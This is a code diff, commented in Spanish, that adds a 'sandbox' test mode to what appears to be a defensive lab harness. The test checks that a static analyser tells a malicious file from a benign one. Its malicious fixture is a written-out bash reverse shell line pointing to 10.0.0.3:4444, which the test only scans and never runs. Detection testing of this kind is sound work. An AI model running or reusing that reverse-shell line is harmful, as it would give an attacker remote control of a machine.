@@ -9,6 +9,7 @@ Modos (los orquesta lab/docker-lab.sh con un contenedor atacante separado):
   net-revsh <ip>    L6: detección + canal bloqueado + SOLO el dueño suspendido
   net-revsh-verify <ip>  L6: el canal sigue muerto sin suspensión y la reversión lo revive
   net-tarpit <ip>   Tarpit (Core): estrangula la IP del escaneo en vez de bloquearla
+  sandbox           F6 estático: distingue un fichero malicioso de uno benigno (sin ejecutar)
   levels            L4, L5, L7, L8, L9 en la víctima + scoreboard
   all               prep + levels (modo clásico de contenedor único)
 
@@ -233,6 +234,24 @@ def net_tarpit(ip):
     return 0 if ok else 1
 
 
+def sandbox_scan():
+    """F6 (Core): el analizador estático distingue un fichero MALICIOSO de uno benigno
+    SIN ejecutar nada. El fixture malicioso es una línea de reverse shell INERTE (jamás
+    se corre: solo se lee); el benigno es el dropper del L5 (una copia de `yes`).
+    """
+    mal = "/work/scan-fixture-malicioso"  # inerte: NUNCA se ejecuta, solo se analiza
+    with open(mal, "w") as f:
+        f.write("#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.3/4444 0>&1\n")
+    mal_ok = "MALICIOSO" in arx("scan", mal)
+    benign = "/tmp/miner" if os.path.exists("/tmp/miner") else "/bin/true"
+    benign_ok = "MALICIOSO" not in arx("scan", benign)
+    os.unlink(mal)
+    ok = mal_ok and benign_ok
+    print(f"[{'PASS' if ok else 'FAIL'}] sandbox estático: fixture malicioso detectado={mal_ok} · "
+          f"binario benigno NO marcado malicioso={benign_ok}")
+    return 0 if ok else 1
+
+
 def levels():
     canary_path = None
     from arx.modules import canaries
@@ -327,6 +346,8 @@ def main():
         return net_revsh_verify(sys.argv[2])
     if mode == "net-tarpit":
         return net_tarpit(sys.argv[2])
+    if mode == "sandbox":
+        return sandbox_scan()
     if mode == "levels":
         return levels()
     prep()
